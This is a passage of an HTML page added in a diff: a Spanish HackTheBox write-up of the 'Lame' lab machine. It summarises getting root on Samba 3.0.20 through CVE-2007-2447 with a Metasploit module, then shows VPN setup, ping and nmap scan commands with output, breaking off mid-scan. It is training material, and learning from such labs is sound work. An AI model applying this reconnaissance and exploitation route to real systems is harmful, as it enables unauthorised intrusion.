@@ -1,0 +1,1059 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Lame — HackTheBox Writeup | Brandeiks</title>
+  <meta name="description" content="Writeup de la máquina Lame de HackTheBox — Dificultad: Fácil. Nmap → SMB Samba 3.0.20 → CVE-2007-2447 → Metasploit usermap_script → Root.">
+  <meta name="author" content="Brandon Zevallos Pastrana">
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%2300ff88' rx='20'/%3E%3Ctext x='50%25' y='50%25' text-anchor='middle' dy='.35em' font-size='70' font-weight='bold' fill='%23050a0e' font-family='monospace'%3EB%3C/text%3E%3C/svg%3E">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet"/>
+  <style>
+    :root {
+      --bg:        #050a0e;
+      --bg2:       #080f14;
+      --bg3:       #0a1520;
+      --green:     #00ff88;
+      --cyan:      #00e5ff;
+      --red:       #ff2d55;
+      --yellow:    #ffd700;
+      --orange:    #ff8c00;
+      --purple:    #bf5fff;
+      --blue:      #4fc3f7;
+      --dim:       #1a2a2e;
+      --text:      #c8d8e0;
+      --text-dim:  #4a6a74;
+      --font-mono: 'Share Tech Mono', monospace;
+      --font-main: 'Rajdhani', sans-serif;
+      --font-disp: 'Orbitron', sans-serif;
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--font-main);
+      overflow-x: hidden;
+      cursor: none;
+    }
+    body::before {
+      content: '';
+      position: fixed; inset: 0;
+      background: repeating-linear-gradient(
+        0deg, transparent, transparent 2px,
+        rgba(0,255,136,0.012) 2px, rgba(0,255,136,0.012) 4px
+      );
+      pointer-events: none; z-index: 1000;
+    }
+
+    /* CURSOR */
+    a, button { cursor: none; }
+    .cursor {
+      position: fixed; width: 10px; height: 10px;
+      background: var(--green); border-radius: 50%;
+      pointer-events: none; z-index: 9999;
+      transform: translate(-50%,-50%);
+      box-shadow: 0 0 12px var(--green); opacity: 0;
+    }
+    .cursor-ring {
+      position: fixed; width: 36px; height: 36px;
+      border: 1px solid var(--green); border-radius: 50%;
+      pointer-events: none; z-index: 9998;
+      transform: translate(-50%,-50%); opacity: 0;
+      transition: all 0.12s ease;
+    }
+
+    /* NAV */
+    nav {
+      position: fixed; top: 0; left: 0; right: 0; z-index: 500;
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 1.2rem 4rem;
+      background: rgba(5,10,14,0.92); backdrop-filter: blur(10px);
+      border-bottom: 1px solid rgba(0,255,136,0.08);
+    }
+    .nav-logo { font-family: var(--font-disp); font-size: 1rem; color: var(--green); letter-spacing: 4px; text-decoration: none; }
+    .nav-back { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); text-decoration: none; letter-spacing: 2px; transition: color 0.3s; }
+    .nav-back::before { content: '← '; }
+    .nav-back:hover { color: var(--green); }
+
+    /* HERO */
+    .writeup-hero {
+      min-height: 42vh; display: flex; align-items: flex-end;
+      padding: 8rem 4rem 3rem; position: relative; overflow: hidden;
+      border-bottom: 1px solid var(--dim);
+    }
+    .hero-grid {
+      position: absolute; inset: 0;
+      background-image:
+        linear-gradient(rgba(0,255,136,0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0,255,136,0.03) 1px, transparent 1px);
+      background-size: 60px 60px;
+    }
+    .hero-glow {
+      position: absolute; width: 600px; height: 400px;
+      background: radial-gradient(ellipse, rgba(255,45,85,0.06) 0%, transparent 70%);
+      top: 0; left: 0; pointer-events: none;
+    }
+    .writeup-hero-content { position: relative; z-index: 2; max-width: 900px; }
+    .breadcrumb { font-family: var(--font-mono); font-size: 0.72rem; color: var(--text-dim); letter-spacing: 2px; margin-bottom: 1.2rem; }
+    .breadcrumb a { color: var(--text-dim); text-decoration: none; transition: color 0.2s; }
+    .breadcrumb a:hover { color: var(--green); }
+    .breadcrumb span { color: var(--green); }
+    .writeup-title { font-family: var(--font-disp); font-size: clamp(2.5rem, 6vw, 4.5rem); font-weight: 900; letter-spacing: 2px; line-height: 1.1; }
+    .writeup-title span { color: var(--green); }
+    .writeup-subtitle { font-family: var(--font-mono); font-size: 0.85rem; color: var(--text-dim); margin-top: 0.8rem; letter-spacing: 1px; }
+    .writeup-meta { display: flex; flex-wrap: wrap; gap: 1rem; align-items: center; margin-top: 1.8rem; }
+    .meta-badge { font-family: var(--font-mono); font-size: 0.68rem; letter-spacing: 2px; padding: 0.3rem 0.8rem; border: 1px solid; }
+    .badge-facil  { color: #00ffcc;  border-color: rgba(0,255,204,0.4);  background: rgba(0,255,204,0.05); }
+    .badge-htb    { color: var(--green);  border-color: rgba(0,255,136,0.3);  background: rgba(0,255,136,0.05); }
+    .badge-linux  { color: var(--blue);  border-color: rgba(79,195,247,0.3);  background: rgba(79,195,247,0.05); }
+    .badge-smb    { color: var(--orange); border-color: rgba(255,140,0,0.4);  background: rgba(255,140,0,0.05); }
+    .badge-cve    { color: var(--red);    border-color: rgba(255,45,85,0.4);   background: rgba(255,45,85,0.05); }
+    .badge-msf    { color: var(--purple); border-color: rgba(191,95,255,0.3);  background: rgba(191,95,255,0.05); }
+    .meta-date { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); }
+
+    /* LAYOUT */
+    .writeup-layout {
+      display: grid; grid-template-columns: 1fr 240px;
+      gap: 3rem; max-width: 1300px; margin: 0 auto; padding: 4rem;
+    }
+
+    /* SIDEBAR */
+    .sidebar { position: sticky; top: 5rem; height: fit-content; order: 2; }
+    .sidebar-box { border: 1px solid var(--dim); padding: 1.5rem; background: var(--bg2); margin-bottom: 1.5rem; }
+    .sidebar-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--green); letter-spacing: 3px; margin-bottom: 1.2rem; }
+    .toc-list { list-style: none; display: flex; flex-direction: column; gap: 0.4rem; }
+    .toc-list a {
+      font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim);
+      text-decoration: none; letter-spacing: 1px; transition: all 0.2s;
+      display: block; padding: 0.25rem 0.8rem;
+      border-left: 2px solid transparent;
+    }
+    .toc-list a:hover { color: var(--green); border-left-color: var(--green); }
+    .toc-list a.active { color: var(--green); border-left-color: var(--green); opacity: 1; }
+    .info-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.8rem; }
+    .info-label { font-family: var(--font-mono); font-size: 0.65rem; color: var(--text-dim); letter-spacing: 1px; }
+    .info-val { font-family: var(--font-mono); font-size: 0.72rem; }
+    .val-green  { color: var(--green); }
+    .val-blue   { color: var(--blue); }
+    .val-yellow { color: var(--yellow); }
+    .val-red    { color: var(--red); }
+    .val-facil  { color: #00ffcc; }
+
+    /* ATTACK PATH */
+    .attack-path { display: flex; flex-direction: column; gap: 0; }
+    .ap-item { display: flex; align-items: flex-start; gap: 0.8rem; padding: 0.5rem 0; }
+    .ap-dot { width: 8px; height: 8px; background: var(--green); border-radius: 50%; margin-top: 4px; flex-shrink: 0; box-shadow: 0 0 6px var(--green); }
+    .ap-line { width: 1px; height: 16px; background: rgba(0,255,136,0.2); margin: 0 3.5px; }
+    .ap-text { font-family: var(--font-mono); font-size: 0.65rem; color: var(--text-dim); line-height: 1.5; }
+    .ap-text span { color: var(--cyan); }
+
+    /* CONTENT */
+    .writeup-content { min-width: 0; order: 1; }
+
+    /* PROGRESS BAR */
+    .progress-container { position: fixed; top: 0; left: 0; width: 100%; height: 3px; background: transparent; z-index: 1001; }
+    .progress-bar { height: 100%; background: var(--green); width: 0%; transition: width 0.15s ease; box-shadow: 0 0 8px var(--green); }
+
+    /* SKIP LINK */
+    .skip-link { position: absolute; top: -40px; left: 0; background: var(--green); color: var(--bg); padding: 8px 16px; z-index: 10000; text-decoration: none; font-family: var(--font-mono); font-size: 0.8rem; transition: top 0.2s; }
+    .skip-link:focus { top: 0; }
+
+    /* COPY BUTTON */
+    .copy-btn {
+      position: absolute; top: 0.5rem; right: 4.5rem;
+      background: var(--dim); border: 1px solid rgba(0,255,136,0.3);
+      color: var(--text-dim); font-family: var(--font-mono);
+      font-size: 0.62rem; padding: 0.15rem 0.5rem; letter-spacing: 1px;
+      cursor: none; opacity: 0; transition: opacity 0.2s, background 0.2s, color 0.2s;
+      z-index: 10; white-space: nowrap;
+    }
+    .cmd-block:hover .copy-btn { opacity: 1; }
+    .copy-btn:hover { background: var(--green); color: var(--bg); border-color: var(--green); }
+    .copy-btn.copied { background: var(--green); color: var(--bg); border-color: var(--green); opacity: 1; }
+
+    /* TOAST */
+    .toast {
+      position: fixed; bottom: 24px; right: 24px;
+      background: var(--green); color: #000;
+      padding: 0.7rem 1.4rem; font-family: var(--font-mono);
+      font-size: 0.75rem; letter-spacing: 2px; font-weight: 600;
+      opacity: 0; transform: translateY(8px);
+      transition: opacity 0.25s, transform 0.25s;
+      pointer-events: none; z-index: 10000;
+    }
+    .toast.show { opacity: 1; transform: translateY(0); }
+
+    /* SECTIONS */
+    .section { margin-bottom: 4rem; opacity: 0; transform: translateY(20px); transition: opacity 0.5s ease, transform 0.5s ease; }
+    .section.visible { opacity: 1; transform: translateY(0); }
+    .section-label { font-family: var(--font-mono); font-size: 0.68rem; color: var(--green); letter-spacing: 4px; margin-bottom: 0.5rem; }
+    .section-title { font-family: var(--font-disp); font-size: 1.5rem; font-weight: 700; letter-spacing: 2px; margin-bottom: 0.6rem; }
+    .section-line { width: 40px; height: 2px; background: var(--green); margin-bottom: 2rem; }
+
+    /* PROSE */
+    .prose p { font-size: 1.05rem; line-height: 1.9; color: var(--text-dim); margin-bottom: 1rem; }
+    .prose p strong { color: var(--text); }
+    .prose p .hl       { color: var(--green); font-weight: bold; }
+    .prose p .hl-cyan  { color: var(--cyan); }
+    .prose p .hl-red   { color: var(--red); }
+    .prose p .hl-yel   { color: var(--yellow); }
+    .prose p .hl-pur   { color: var(--purple); }
+    .prose p .hl-blue  { color: var(--blue); }
+    .prose p .hl-ora   { color: var(--orange); }
+
+    /* STEP */
+    .step-marker { display: flex; align-items: center; gap: 1rem; margin-bottom: 1.2rem; margin-top: 2.5rem; }
+    .step-num { font-family: var(--font-disp); font-size: 0.65rem; color: var(--bg); background: var(--green); width: 26px; height: 26px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; font-weight: 900; }
+    .step-title { font-family: var(--font-mono); font-size: 0.8rem; color: var(--green); letter-spacing: 2px; }
+
+    /* CMD BLOCK */
+    .cmd-block {
+      background: var(--bg3); border: 1px solid rgba(0,229,255,0.15);
+      border-left: 3px solid var(--cyan); padding: 1rem 1.2rem;
+      margin: 1rem 0; font-family: var(--font-mono); font-size: 0.82rem;
+      overflow-x: auto; position: relative; line-height: 1.8;
+    }
+    .cmd-block .cmd-label { position: absolute; top: 0.5rem; right: 0.8rem; font-size: 0.6rem; color: var(--text-dim); letter-spacing: 2px; }
+    .cmd-block .prompt { color: var(--green); user-select: none; }
+    .cmd-block .cmd    { color: var(--text); }
+    .cmd-block .flag   { color: var(--cyan); }
+    .cmd-block .arg    { color: var(--yellow); }
+    .cmd-block .comment { color: var(--text-dim); font-size: 0.75rem; }
+    .cmd-block .msf-prompt { color: var(--purple); user-select: none; }
+
+    /* OUTPUT */
+    .output-block {
+      background: #020608; border: 1px solid var(--dim);
+      padding: 1rem 1.2rem; margin: 0.5rem 0 1.5rem;
+      font-family: var(--font-mono); font-size: 0.77rem;
+      line-height: 1.9; color: var(--text-dim); overflow-x: auto;
+    }
+    .output-block .o-green  { color: var(--green); }
+    .output-block .o-cyan   { color: var(--cyan); }
+    .output-block .o-red    { color: var(--red); }
+    .output-block .o-yellow { color: var(--yellow); }
+    .output-block .o-white  { color: var(--text); }
+    .output-block .o-purple { color: var(--purple); }
+    .output-block .o-blue   { color: var(--blue); }
+    .output-block .o-orange { color: var(--orange); }
+
+    /* INFO BOX */
+    .info-box { border: 1px solid rgba(0,229,255,0.2); background: rgba(0,229,255,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+    .info-box-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--cyan); letter-spacing: 3px; margin-bottom: 0.6rem; }
+    .info-box p { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.7; }
+    .info-box p strong { color: var(--cyan); }
+
+    .warn-box { border: 1px solid rgba(255,140,0,0.25); background: rgba(255,140,0,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+    .warn-box-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--orange); letter-spacing: 3px; margin-bottom: 0.6rem; }
+    .warn-box p { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.7; }
+    .warn-box p strong { color: var(--orange); }
+
+    .cve-box { border: 1px solid rgba(255,45,85,0.3); background: rgba(255,45,85,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+    .cve-box-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--red); letter-spacing: 3px; margin-bottom: 0.6rem; }
+    .cve-box p { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.7; }
+    .cve-box p strong { color: var(--red); }
+
+    /* VULN TABLE */
+    .vuln-table { width: 100%; border-collapse: collapse; margin: 1.5rem 0; }
+    .vuln-table th, .vuln-table td { font-family: var(--font-mono); font-size: 0.72rem; padding: 0.8rem 1rem; text-align: left; border-bottom: 1px solid var(--dim); }
+    .vuln-table th { color: var(--cyan); letter-spacing: 2px; border-bottom-color: rgba(0,229,255,0.2); }
+    .vuln-table td { color: var(--text-dim); }
+    .vuln-table td:first-child { color: var(--green); }
+
+    /* DIVIDER */
+    hr.divider { border: none; height: 1px; background: linear-gradient(90deg, rgba(0,255,136,0.3), transparent); margin: 3rem 0; }
+
+    /* CMD REF SECTION */
+    .cmd-ref-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.2rem; margin-top: 1.5rem; }
+    .cmd-ref-card { border: 1px solid var(--dim); background: var(--bg2); padding: 1.5rem; transition: border-color 0.3s; }
+    .cmd-ref-card:hover { border-color: rgba(0,229,255,0.25); }
+    .cmd-ref-name { font-family: var(--font-mono); font-size: 0.9rem; color: var(--cyan); margin-bottom: 0.5rem; letter-spacing: 1px; }
+    .cmd-ref-syntax { font-family: var(--font-mono); font-size: 0.72rem; color: var(--green); background: var(--bg3); padding: 0.4rem 0.7rem; margin-bottom: 0.8rem; display: inline-block; }
+    .cmd-ref-desc { font-size: 0.92rem; color: var(--text-dim); line-height: 1.7; margin-bottom: 0.8rem; }
+    .cmd-ref-flags { list-style: none; display: flex; flex-direction: column; gap: 0.3rem; }
+    .cmd-ref-flags li { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); }
+    .cmd-ref-flags li span { color: var(--yellow); }
+
+    /* GLOSARIO */
+    .glosario-grid { display: grid; grid-template-columns: 1fr; gap: 1rem; margin-top: 1.5rem; }
+    .glos-card { border: 1px solid var(--dim); background: var(--bg2); padding: 1.4rem 1.5rem; transition: border-color 0.3s; }
+    .glos-card:hover { border-color: rgba(0,229,255,0.2); }
+    .glos-term { font-family: var(--font-mono); font-size: 0.88rem; color: var(--cyan); margin-bottom: 0.4rem; letter-spacing: 1px; }
+    .glos-def { font-size: 0.95rem; color: var(--text-dim); line-height: 1.75; }
+    .glos-def strong { color: var(--green); }
+    .glos-def code { color: var(--yellow); font-family: var(--font-mono); font-size: 0.85em; }
+
+    /* FLAGS SECTION */
+    .flags-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; margin-top: 1.5rem; }
+    .flag-card { border: 1px solid rgba(0,255,136,0.2); background: rgba(0,255,136,0.03); padding: 1.5rem; }
+    .flag-label { font-family: var(--font-mono); font-size: 0.65rem; color: var(--text-dim); letter-spacing: 3px; margin-bottom: 0.5rem; }
+    .flag-user { font-family: var(--font-mono); font-size: 1rem; color: var(--green); word-break: break-all; }
+    .flag-root-card { border: 1px solid rgba(255,45,85,0.2); background: rgba(255,45,85,0.03); padding: 1.5rem; }
+    .flag-root { font-family: var(--font-mono); font-size: 1rem; color: var(--red); word-break: break-all; }
+
+    /* FOOTER */
+    footer { padding: 2rem 4rem; border-top: 1px solid var(--dim); display: flex; justify-content: space-between; align-items: center; margin-top: 4rem; }
+    footer p { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); letter-spacing: 1px; }
+    footer span { color: var(--green); }
+
+    @media (max-width: 960px) {
+      nav, .writeup-hero, footer { padding-left: 1.5rem; padding-right: 1.5rem; }
+      .writeup-layout { grid-template-columns: 1fr; padding: 2rem 1.5rem; }
+      .sidebar { position: static; }
+      .cmd-ref-grid, .flags-grid { grid-template-columns: 1fr; }
+      body, a, button { cursor: auto; }
+      .cursor, .cursor-ring { display: none; }
+    }
+  </style>
+</head>
+<body>
+
+<a href="#main-content" class="skip-link">Saltar al contenido principal</a>
+<div class="progress-container"><div class="progress-bar" id="readingProgress"></div></div>
+<div class="cursor" id="cursor"></div>
+<div class="cursor-ring" id="cursorRing"></div>
+
+<nav>
+  <a href="../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+  <a href="../../index.html" class="nav-back">volver al portafolio</a>
+</nav>
+
+<!-- HERO -->
+<div class="writeup-hero">
+  <div class="hero-grid"></div>
+  <div class="hero-glow"></div>
+  <div class="writeup-hero-content">
+    <p class="breadcrumb">
+      <a href="../../index.html">brandeiks</a> /
+      <a href="../">writeups</a> /
+      <a href="../../writeups/hackthebox/">hackthebox</a> /
+      <span>lame</span>
+    </p>
+    <h1 class="writeup-title"><span>Lame</span></h1>
+    <p class="writeup-subtitle">HackTheBox — Linux · Nmap → vsftpd 2.3.4 (backdoor no funciona) → Samba 3.0.20 → CVE-2007-2447 → Metasploit → Root</p>
+    <div class="writeup-meta">
+      <span class="meta-badge badge-facil">● FÁCIL</span>
+      <span class="meta-badge badge-htb">HACKTHEBOX</span>
+      <span class="meta-badge badge-linux">LINUX</span>
+      <span class="meta-badge badge-smb">SMB · SAMBA</span>
+      <span class="meta-badge badge-cve">CVE-2007-2447</span>
+      <span class="meta-badge badge-msf">METASPLOIT</span>
+      <span class="meta-date">📅 Junio 2026 · By Brandeiks</span>
+    </div>
+  </div>
+</div>
+
+<!-- LAYOUT -->
+<div class="writeup-layout">
+
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ÍNDICE</p>
+      <ul class="toc-list">
+        <li><a href="#resumen">01 · Resumen</a></li>
+        <li><a href="#conexion">02 · Conexión</a></li>
+        <li><a href="#reconocimiento">03 · Reconocimiento</a></li>
+        <li><a href="#vsftpd">04 · vsftpd — Falsa Pista</a></li>
+        <li><a href="#samba">05 · Enumeración Samba</a></li>
+        <li><a href="#explotacion">06 · Explotación CVE-2007-2447</a></li>
+        <li><a href="#flags">07 · Flags</a></li>
+        <li><a href="#referencia">08 · Referencia de Comandos</a></li>
+        <li><a href="#glosario">09 · Glosario</a></li>
+      </ul>
+    </div>
+    <div class="sidebar-box">
+      <p class="sidebar-title">// INFO</p>
+      <div class="info-row"><span class="info-label">Plataforma</span><span class="info-val val-green">HackTheBox</span></div>
+      <div class="info-row"><span class="info-label">OS</span><span class="info-val val-blue">Linux</span></div>
+      <div class="info-row"><span class="info-label">Dificultad</span><span class="info-val val-facil">Fácil</span></div>
+      <div class="info-row"><span class="info-label">IP Target</span><span class="info-val" style="color:var(--text)">10.10.10.3</span></div>
+      <div class="info-row"><span class="info-label">Puertos</span><span class="info-val val-yellow">21 / 22 / 139 / 445</span></div>
+      <div class="info-row"><span class="info-label">Estado</span><span class="info-val val-green">● Pwned</span></div>
+    </div>
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ATTACK PATH</p>
+      <div class="attack-path">
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>ping -c3</span> → TTL 63 → Linux</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>nmap -Pn</span> → 4 puertos abiertos</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>vsftpd 2.3.4</span> → backdoor bloqueado</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>smbmap -H</span> → tmp READ/WRITE</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Samba 3.0.20</span> → CVE-2007-2447</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>msf usermap_script</span> → shell</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot" style="background:var(--red);box-shadow:0 0 6px var(--red)"></div><div class="ap-text"><span style="color:var(--red)">whoami: root</span> → flags capturadas</div></div>
+      </div>
+    </div>
+  </aside>
+
+  <!-- CONTENT -->
+  <main class="writeup-content" id="main-content">
+
+    <!-- RESUMEN -->
+    <div class="section" id="resumen">
+      <p class="section-label">// 01</p>
+      <h2 class="section-title">Resumen</h2>
+      <div class="section-line"></div>
+      <div class="prose">
+        <p>
+          <strong>Lame</strong> es la primera máquina publicada en <span class="hl-cyan">HackTheBox</span>,
+          de dificultad <span class="hl">fácil</span>. Corre <strong>Linux</strong> y expone cuatro servicios:
+          <span class="hl-yel">FTP</span> (vsftpd 2.3.4), <span class="hl-blue">SSH</span>,
+          y <span class="hl-ora">Samba</span> en los puertos 139 y 445.
+        </p>
+        <p>
+          El ataque comienza explorando el backdoor conocido en
+          <span class="hl-red">vsftpd 2.3.4</span>, descubierto en 2011, que en esta máquina está
+          bloqueado y no funciona. El vector real es <strong>Samba 3.0.20</strong>, vulnerable al
+          <span class="hl-red">CVE-2007-2447</span>: una inyección de comandos shell a través del
+          parámetro "username map script" en <code style="color:var(--yellow)">smb.conf</code>.
+        </p>
+        <p>
+          Usando el módulo de <span class="hl-pur">Metasploit</span> <code style="color:var(--yellow)">exploit/multi/samba/usermap_script</code>
+          con el LHOST correcto (IP de la VPN), se obtiene una shell directa como
+          <strong>root</strong> sin necesidad de escalada de privilegios.
+        </p>
+      </div>
+
+      <table class="vuln-table">
+        <thead>
+          <tr><th>Fase</th><th>Técnica / Herramienta</th><th>Resultado</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>Reconocimiento</td><td>ping -c3 + nmap -Pn</td><td>OS Linux (TTL 63) · 4 puertos abiertos</td></tr>
+          <tr><td>Escaneo de servicios</td><td>nmap -p21,22,139,445 -sCV -Pn</td><td>vsftpd 2.3.4 · OpenSSH 4.7p1 · Samba 3.0.20</td></tr>
+          <tr><td>Intento FTP</td><td>Metasploit vsftpd_234_backdoor</td><td>Exploit completo pero sin sesión creada</td></tr>
+          <tr><td>Enum. Samba</td><td>smbmap -H / smbclient -N</td><td>Share tmp con READ/WRITE · Samba 3.0.20-Debian</td></tr>
+          <tr><td>Explotación</td><td>Metasploit usermap_script · CVE-2007-2447</td><td>Command shell session 1 abierta como root</td></tr>
+          <tr><td>Post-explot.</td><td>cd /root · cd /home/makis</td><td>root.txt + user.txt capturadas</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <hr class="divider">
+
+    <!-- CONEXIÓN -->
+    <div class="section" id="conexion">
+      <p class="section-label">// 02</p>
+      <h2 class="section-title">Conexión</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">1</div>
+        <span class="step-title">PREPARAR EL EQUIPO — OPENVPN</span>
+      </div>
+      <div class="prose">
+        <p>
+          Descargamos el archivo VPN desde HackTheBox y lo conectamos con
+          <span class="hl-cyan">openvpn</span>. Luego encendemos la máquina Lame desde la plataforma
+          y copiamos su IP objetivo: <strong>10.10.10.3</strong>. El LHOST que usaremos en Metasploit
+          será la IP asignada a nuestra interfaz VPN (en este caso <span class="hl-yel">10.10.14.246</span>).
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sudo openvpn lab_Masker10.ovpn">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">VPN</span>
+        <div><span class="prompt">$ </span><span class="cmd">sudo openvpn <span class="arg">lab_Masker10.ovpn</span></span></div>
+      </div>
+
+      <div class="info-box">
+        <div class="info-box-title">// NOTA IMPORTANTE — LHOST</div>
+        <p>En HackTheBox, el <strong>LHOST</strong> para Metasploit NO es la IP de tu máquina local
+        (ej. 192.168.x.x), sino la IP de tu interfaz <strong>tun0</strong> (VPN). Puedes verla con
+        <code>ip a show tun0</code>. Si usas la IP incorrecta, el exploit ejecutará pero no podrá
+        establecer la sesión.</p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- RECONOCIMIENTO -->
+    <div class="section" id="reconocimiento">
+      <p class="section-label">// 03</p>
+      <h2 class="section-title">Reconocimiento</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">1</div>
+        <span class="step-title">VERIFICACIÓN DE CONECTIVIDAD — PING</span>
+      </div>
+      <div class="prose">
+        <p>
+          Verificamos que la máquina está activa y determinamos el sistema operativo analizando
+          el <span class="hl-cyan">TTL</span>. El TTL de respuesta es <strong>63</strong>, que
+          indica <span class="hl">Linux</span> (TTL inicial 64 menos 1 salto de red).
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="ping -c3 10.10.10.3">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">PING</span>
+        <div><span class="prompt">$ </span><span class="cmd">ping <span class="flag">-c3</span> <span class="arg">10.10.10.3</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>PING 10.10.10.3 (10.10.10.3) 56(84) bytes of data.</div>
+        <div>64 bytes from 10.10.10.3: icmp_seq=3 ttl=<span class="o-yellow">63</span> time=155 ms</div>
+        <div>&nbsp;</div>
+        <div>--- 10.10.10.3 ping statistics ---</div>
+        <div>3 packets transmitted, 1 received, 66.6667% packet loss, time 2040ms</div>
+        <div>rtt min/avg/max/mdev = 154.641/154.641/154.641/0.000 ms</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">2</div>
+        <span class="step-title">ESCANEO INICIAL — NMAP -Pn</span>
+      </div>
+      <div class="prose">
+        <p>
+          Escaneamos los puertos de forma silenciosa con <span class="hl-cyan">-Pn</span> (sin
+          enviar paquetes ICMP para detectar el host). Identificamos <strong>4 puertos TCP abiertos</strong>:
+          FTP en el 21, SSH en el 22, y SMB/NetBIOS en los puertos 139 y 445.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="nmap -Pn 10.10.10.3">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">NMAP</span>
+        <div><span class="prompt">$ </span><span class="cmd">nmap <span class="flag">-Pn</span> <span class="arg">10.10.10.3</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-21 19:17 EDT</div>
+        <div>Nmap scan report for 10.10.10.3</div>
+        <div>Host is up (0.11s latency).</div>
+        <div>Not shown: 996 filtered tcp ports (no-response)</div>
+        <div>PORT&nbsp;&nbsp;&nbsp;&nbsp; STATE SERVICE</div>
+        <div><span class="o-green">21/tcp&nbsp;&nbsp; open&nbsp; ftp</span></div>
+        <div><span class="o-green">22/tcp&nbsp;&nbsp; open&nbsp; ssh</span></div>
+        <div><span class="o-green">139/tcp&nbsp; open&nbsp; netbios-ssn</span></div>
+        <div><span class="o-green">445/tcp&nbsp; open&nbsp; microsoft-ds</span></div>
+        <div>&nbsp;</div>
+        <div>Nmap done: 1 IP address (1 host up) scanned in 8.68 seconds</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">3</div>
+        <span class="step-title">ESCANEO PROFUNDO — VERSIONES Y SCRIPTS NSE</span>
+      </div>
+      <div class="prose">
+        <p>
+          Con los puertos identificados, lanzamos un escaneo detallado con
+          <span class="hl-cyan">-sCV</span> para obtener versiones exactas y ejecutar scripts NSE.
+          Descubrimos información clave: <strong>vsftpd 2.3.4</strong> en el FTP, <strong>OpenSSH 4.7p1</strong>
+          en el 22, y <strong>Samba smbd 3.0.20-Debian</strong> en los puertos SMB.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="nmap -p21,22,139,445 -sCV -Pn 10.10.10.3">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">NMAP DEEP</span>
+        <div><span class="prompt">$ </span><span class="cmd">nmap <span class="flag">-p21,22,139,445</span> <span class="flag">-sCV</span> <span class="flag">-Pn</span> <span class="arg">10.10.10.3</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>PORT&nbsp;&nbsp;&nbsp;&nbsp; STATE SERVICE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; VERSION</div>
+        <div><span class="o-yellow">21/tcp&nbsp;&nbsp; open&nbsp; ftp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; vsftpd 2.3.4</span></div>
+        <div>| ftp-anon: Anonymous FTP login allowed (FTP code 230)</div>
+        <div>| ftp-syst:</div>
+        <div>|&nbsp;&nbsp; vsFTPd 2.3.4 - secure, fast, stable</div>
+        <div>22/tcp&nbsp;&nbsp; open&nbsp; ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)</div>
